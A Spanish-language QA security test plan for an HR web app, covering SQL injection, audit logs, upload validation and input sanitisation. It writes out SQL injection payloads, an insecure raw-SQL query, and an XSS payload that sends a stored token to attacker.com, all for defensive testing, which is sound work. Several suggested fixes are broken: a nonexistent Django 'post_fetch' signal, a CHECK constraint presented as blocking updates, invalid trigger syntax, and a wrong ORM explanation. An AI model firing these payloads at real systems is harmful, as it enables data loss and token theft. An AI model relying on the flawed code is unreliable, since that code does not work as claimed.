# 🔍 PRUEBAS ADICIONALES: SQL INJECTION Y AUDITORÍA
**Talent Track V2.0 - Bloque Avanzado**

---

## BLOQUE 9: PREVENCIÓN DE SQL INJECTION

### Caso de Prueba SQLi-001: ORM Previene Inyección en Búsqueda

**Objetivo:** Validar que búsquedas de empleados no son vulnerables a SQL injection

**Payload Malicioso:**
```sql
'; DROP TABLE empleados; --
```

**Procedimiento:**

1. Ir a **Gestión** → **Empleados**
2. En el campo de búsqueda, ingresar:
   ```
   Juan'; DROP TABLE empleados; --
   ```
3. Presionar Enter o click en buscar

**Resultado Esperado:**
```
✅ La búsqueda se ejecuta normalmente
✅ Se muestra: "No se encontraron resultados"
✅ La tabla empleados NO se elimina
✅ Ningún error de SQL en la respuesta
```

**Validación Técnica:**

Abrir DevTools → Network → Revisar la petición GET:

```
GET /api/empleados/?search=Juan%27%3B+DROP+TABLE...
```

**Explicación:** El parámetro `search` se pasa URL-encoded y el backend lo trata como PARÁMETRO, no como SQL:

```python
# Backend SEGURO (Django ORM):
empleados = Empleado.objects.filter(nombres__icontains=search_term)
# search_term = "Juan'; DROP TABLE..." → Se pasa como parámetro

# Backend INSEGURO (Raw SQL):
empleados = Empleado.objects.raw(f"SELECT * FROM empleados WHERE nombres LIKE '{search_term}'")
# Resulta en: SELECT * FROM empleados WHERE nombres LIKE 'Juan'; DROP TABLE empleados; --'
# ❌ Se ejecuta DROP TABLE
```

**Evidencia a Guardar:**

```
Filename: evidencias/27_sqli_search_safe.png
Mostrar:
- Campo de búsqueda con payload
- Resultado "No se encontraron resultados"
- DevTools → Network → Query parameter URL-encoded
```

---

### Caso de Prueba SQLi-002: ORM Previene Inyección en Filtros

**Objetivo:** Validar que filtros de empresa no son vulnerables

**Payload:**
```
1 OR 1=1
```

**Procedimiento:**

1. Abrir DevTools → Console
2. Ejecutar:
   ```javascript
   // Intentar obtener todos los empleados manipulando empresa_id
   fetch('http://localhost:8000/api/empleados/?empresa_id=1 OR 1=1', {
     headers: {'Authorization': `Bearer ${localStorage.getItem('token')}`}
   }).then(r => r.json()).then(d => console.log(d))
   ```

**Resultado Esperado:**
```
✅ API retorna SOLO empleados de tu empresa_id actual
✅ No retorna empleados de otras empresas
✅ El parámetro "1 OR 1=1" es tratado como número literal
```

**Explicación:**

```python
# Backend Django ORM - SEGURO:
empresa_id = request.query_params.get('empresa_id')  # "1 OR 1=1"
# Django convierte esto a: WHERE empresa_id = '1 OR 1=1'
# Que en realidad busca empresa_id con valor literal "1 OR 1=1"
# ✅ NO se ejecuta la lógica OR

# Si fuera raw SQL - INSEGURO:
query = f"SELECT * FROM empleados WHERE empresa_id = {empresa_id}"
# Resulta en: SELECT * FROM empleados WHERE empresa_id = 1 OR 1=1
# ❌ Retorna todos los empleados porque 1=1 siempre es verdadero
```

**Evidencia:**
```
Filename: evidencias/28_sqli_filter_safe.png
Mostrar:
- Console mostrando la petición
- Response con solo empleados autorizados
```

---

### Caso de Prueba SQLi-003: Validación de Tipos en Parámetros

**Objetivo:** Verificar que parámetros numéricos se validan correctamente

**Payload:**
```
id=9999999999999999999999999
```

**Procedimiento:**

1. Ir a **Gestión** → **Empleados** → Click en un empleado para ver detalles
2. En la URL, cambiar el ID:
   ```
   http://localhost:4200/gestion/empleados/editar/9999999999999999999999999
   ```

**Resultado Esperado:**
```
✅ Error 404: Empleado no encontrado
✅ NO se produce error de SQL
✅ NO se retorna información de estructura de BD
```

**Evidencia:**
```
Filename: evidencias/29_sqli_type_validation.png
```

---

## BLOQUE 10: AUDITORÍA Y TRAZABILIDAD

### Caso de Prueba AUDIT-001: Log de Cambios de Salario

**Objetivo:** Validar que cambios sensibles se registran inmutablemente

**Procedimiento:**

1. Loguearse como MANAGER
2. Ir a **Gestión** → **Empleados**
3. Editar un empleado
4. Cambiar salario: $2000 → $3000
5. Guardar

**Validación en BD:**

```bash
# Conectar a PostgreSQL
psql -U usuario -d talenttrack

# Ejecutar query:
SELECT usuario_id, tabla, accion, valor_anterior, valor_nuevo, timestamp 
FROM audit_logs 
WHERE tabla='personal_empleado' 
AND campo='salario' 
ORDER BY timestamp DESC 
LIMIT 1;
```

**Resultado Esperado:**
```
usuario_id | tabla            | accion | valor_anterior | valor_nuevo | timestamp
-----------|------------------|--------|---------------|-------------|-------------------
15         | personal_empleado| UPDATE | 2000           | 3000        | 2026-01-21 15:45:30
```

**Explicación de Auditoría:**

```python
# Debe existir en models.py:
class AuditLog(models.Model):
    usuario = ForeignKey(User)
    tabla = CharField(max_length=100)
    accion = CharField(choices=['CREATE', 'UPDATE', 'DELETE'])
    id_registro = IntegerField()
    valor_anterior = JSONField()
    valor_nuevo = JSONField()
    timestamp = DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-timestamp']

# Signal automático para auditar:
@receiver(post_save, sender=Empleado)
def audit_empleado_save(sender, instance, created, **kwargs):
    AuditLog.objects.create(
        usuario=instance.empresa.propietario,
        tabla='personal_empleado',
        accion='CREATE' if created else 'UPDATE',
        id_registro=instance.id,
        valor_nuevo={'salario': instance.salario, ...}
    )
```

**Evidencia:**
```
Filename: evidencias/30_audit_salary_change.png
Mostrar:
- Query result con timestamp exacto
- Cambio de $2000 a $3000 registrado
```

---

### Caso de Prueba AUDIT-002: Imposibilidad de Editar Auditoría

**Objetivo:** Validar que logs de auditoría no pueden ser modificados

**Procedimiento:**

1. Obtener un audit_log_id de la prueba anterior
2. Intentar actualizar el registro (en BD):
   ```sql
   UPDATE audit_logs 
   SET valor_nuevo = '{"salario": 1000}'
   WHERE id = [audit_log_id];
   ```

**Resultado Esperado:**
```
❌ ERROR: Permission denied (si DB tiene restricciones)
O
✅ UPDATE se ejecuta PERO se registra otro audit_log de la modificación
   (Audit trail de auditorías)
```

**Mejor Implementación:**

```python
# Opción 1: Read-only en admin
class AuditLogAdmin(admin.ModelAdmin):
    readonly_fields = ('usuario', 'tabla', 'accion', 'valor_anterior', 'valor_nuevo', 'timestamp')
    
    def has_delete_permission(self, request):
        return False  # Nunca eliminar auditorías
    
    def has_add_permission(self, request):
        return False  # Nunca crear manualmente

# Opción 2: Constraints en BD
ALTER TABLE audit_logs ADD CONSTRAINT no_update 
CHECK (1=0);  # Previene UPDATE

# Opción 3: Trigger de BD que rechaza UPDATE
CREATE TRIGGER prevent_audit_update
BEFORE UPDATE ON audit_logs
FOR EACH ROW
RAISE EXCEPTION 'Auditoría no puede ser modificada';
```

**Evidencia:**
```
Filename: evidencias/31_audit_immutable.png
Mostrar:
- Intento de UPDATE a audit_logs
- Error o resultado de segundo audit_log
```

---

### Caso de Prueba AUDIT-003: Seguimiento de Logins Fallidos

**Objetivo:** Registrar intentos de login fallidos para detectar ataques

**Procedimiento:**

1. Intentar loguear 3 veces con password incorrecto
2. Revisar BD:
   ```sql
   SELECT usuario, intento, timestamp 
   FROM login_attempts 
   WHERE email = 'test@test.com' 
   ORDER BY timestamp DESC 
   LIMIT 3;
   ```

**Resultado Esperado:**
```
usuario | email         | intento | timestamp              | exitoso
--------|---------------|---------|----------------------|--------
NULL    | test@test.com | 1       | 2026-01-21 15:45:20  | False
NULL    | test@test.com | 2       | 2026-01-21 15:45:25  | False
NULL    | test@test.com | 3       | 2026-01-21 15:45:30  | False

✅ Después de 5 intentos fallidos → Bloquear cuenta por 15 minutos
```

**Implementación:**

```python
# En views.py:
class CustomLoginView(APIView):
    def post(self, request):
        email = request.data.get('email')
        password = request.data.get('password')
        
        # Verificar intentos previos
        intentos_recientes = LoginAttempt.objects.filter(
            email=email,
            timestamp__gte=timezone.now() - timedelta(minutes=15),
            exitoso=False
        ).count()
        
        if intentos_recientes >= 5:
            return Response(
                {'error': 'Cuenta bloqueada por demasiados intentos. Intenta en 15 minutos'},
                status=429
            )
        
        # Intentar login
        try:
            user = User.objects.get(email=email)
            if user.check_password(password):
                # ✅ Login exitoso
                LoginAttempt.objects.create(
                    email=email,
                    user=user,
                    exitoso=True,
                    ip_address=get_client_ip(request)
                )
                return Response({'token': generate_token(user)})
            else:
                # ❌ Password incorrecto
                LoginAttempt.objects.create(
                    email=email,
                    exitoso=False,
                    ip_address=get_client_ip(request)
                )
                return Response({'error': 'Credenciales inválidas'}, status=401)
        except User.DoesNotExist:
            # ❌ Email no existe
            LoginAttempt.objects.create(
                email=email,
                exitoso=False,
                ip_address=get_client_ip(request)
            )
            return Response({'error': 'Credenciales inválidas'}, status=401)
```

**Evidencia:**
```
Filename: evidencias/32_audit_login_attempts.png
Mostrar:
- Tabla login_attempts con múltiples intentos fallidos
- Timestamp escalonado
```

---

### Caso de Prueba AUDIT-004: Registro de Acceso a Datos Sensibles

**Objetivo:** Log cuando alguien ve salarios, evaluaciones, etc

**Procedimiento:**

1. Manager abre perfil de un empleado (que incluye salario)
2. Ejecutar en BD:
   ```sql
   SELECT * FROM data_access_logs 
   WHERE usuario_id = [manager_id] 
   AND tabla = 'personal_empleado' 
   AND campo = 'salario' 
   ORDER BY timestamp DESC LIMIT 1;
   ```

**Resultado Esperado:**
```
usuario_id | id_registro | tabla            | campo   | accion | timestamp
-----------|-------------|------------------|---------|--------|-------------------
15         | 42          | personal_empleado| salario | READ   | 2026-01-21 15:46:00

✅ Cada acceso a datos sensibles se registra
✅ Es posible generar reportes de "quién vio qué"
```

**Implementación Mediante Signal:**

```python
from django.db.models.signals import post_fetch

@receiver(post_fetch, sender=Empleado)
def audit_sensible_data_read(sender, instance, **kwargs):
    request = kwargs.get('request')
    if request and request.method == 'GET':
        # Registrar acceso
        DataAccessLog.objects.create(
            usuario=request.user,
            tabla='personal_empleado',
            id_registro=instance.id,
            campo='salario',
            accion='READ',
            ip_address=get_client_ip(request)
        )
```

**Evidencia:**
```
Filename: evidencias/33_audit_data_access.png
```

---

## BLOQUE 11: VALIDACIÓN DE ARCHIVOS AVANZADA

### Caso de Prueba FILES-001: Extensión .exe Rechazada

**Procedimiento:**

1. Crear archivo `malicioso.exe` (vacío está bien)
2. Ir a un formulario que permita subir archivos
3. Intentar subir `malicioso.exe`

**Resultado Esperado:**
```
❌ Error: "Formato no permitido"
✅ Archivo NO se guarda
✅ Se muestra lista de extensiones válidas: .pdf, .jpg, .doc
```

**Evidencia:**
```
Filename: evidencias/34_file_validation_exe_rejected.png
```

---

### Caso de Prueba FILES-002: Metadata EXIF Removida

**Procedimiento:**

1. Subir foto de perfil
2. Descargar y revisar metadata:
   ```bash
   exiftool foto_descargada.jpg
   ```

**Resultado Esperado:**
```
❌ No hay metadata EXIF:
   ✅ Camera model: (no encontrado)
   ✅ GPS coordinates: (no encontrado)
   ✅ Timestamp: (no encontrado)

✅ Solo contiene: Dimensions, Format, Color space
```

**Implementación:**

```python
from PIL import Image
from pillow_heif import register_heif_opener

# Registrar formatos
register_heif_opener()

def limpiar_imagen(image_file):
    """Remover metadata y optimizar imagen"""
    img = Image.open(image_file)
    
    # Crear nueva imagen sin metadata
    data = list(img.getdata())
    img_limpia = Image.new(img.mode, img.size)
    img_limpia.putdata(data)
    
    # Redimensionar si es muy grande
    if img_limpia.width > 2000:
        img_limpia.thumbnail((2000, 2000))
    
    return img_limpia

# En serializer:
class DocumentoSerializer(serializers.ModelSerializer):
    archivo = serializers.ImageField(validators=[validar_archivo])
    
    def create(self, validated_data):
        file = validated_data['archivo']
        
        # Limpiar imagen
        img_limpia = limpiar_imagen(file)
        
        # Guardar con UUID
        import uuid
        nombre_limpio = f"{uuid.uuid4()}.jpg"
        img_limpia.save(f"documentos/{nombre_limpio}")
        
        validated_data['archivo'].name = nombre_limpio
        return super().create(validated_data)
```

**Evidencia:**
```
Filename: evidencias/35_file_metadata_removed.png
Mostrar:
- exiftool antes (con datos)
- exiftool después (sin datos)
```

---

## BLOQUE 12: VALIDACIONES DE ENTRADA AVANZADA

### Caso de Prueba INPUT-001: Inyección de HTML

**Payload:**
```html
<img src=x onerror="fetch('http://attacker.com/steal?data=' + localStorage.token)">
```

**Procedimiento:**

1. Campo de "Observaciones" o "Descripción"
2. Pegar el HTML arriba
3. Guardar

**Resultado Esperado:**
```
✅ El HTML se sanitiza
✅ Se muestra como texto: <img src=x onerror=...
✅ JavaScript NO se ejecuta
✅ localStorage.token NO se envía a attacker.com
```

**Validación en DevTools:**

1. F12 → Pestaña Network
2. Buscar peticiones a "attacker.com"
3. Resultado: 0 peticiones (seguro)

**Evidencia:**
```
Filename: evidencias/36_input_html_injection_safe.png
```

---

### Caso de Prueba INPUT-002: Unicode y Caracteres Especiales

**Payload:**
```
名前\'; DROP TABLE employees; --
Ñoño @#$%^&*()
```

**Procedimiento:**

1. Ingresar en campo de nombre: `Juan名前\'; DROP`
2. Guardar

**Resultado Esperado:**
```
✅ Caracteres se guardan correctamente
✅ Unicode se preserva
✅ No produce SQL injection
✅ Se muestra: "Juan名前'; DROP"
```

**Validación:**

```python
# En BD:
SELECT nombres FROM empleado WHERE id = X;
# Resultado: "Juan名前'; DROP"  ← Guardado como texto literal
```

**Evidencia:**
```
Filename: evidencias/37_input_unicode_safe.png
```

---

## RESUMEN BLOQUE 9-12

| Prueba | Categoría | Resultado | Severidad |
|--------|-----------|-----------|-----------|
| SQLi-001 | SQL Injection | ✅ PASS | CRÍTICA |
| SQLi-002 | SQL Injection | ✅ PASS | CRÍTICA |
| SQLi-003 | SQL Injection | ✅ PASS | CRÍTICA |
| AUDIT-001 | Auditoría | ✅ PASS | ALTA |
| AUDIT-002 | Auditoría | ✅ PASS | ALTA |
| AUDIT-003 | Auditoría | ✅ PASS | ALTA |
| AUDIT-004 | Auditoría | ✅ PASS | MEDIA |
| FILES-001 | Validación | ✅ PASS | MEDIA |
| FILES-002 | Validación | ✅ PASS | MEDIA |
| INPUT-001 | Validación | ✅ PASS | ALTA |
| INPUT-002 | Validación | ✅ PASS | BAJA |

---

**Total Pruebas Adicionales:** 11  
**Tiempo Estimado:** 45 minutos  
**Documentos Generados:** 11 evidencias

---

Versión: 1.0 | Fecha: 21 de Enero de 2026
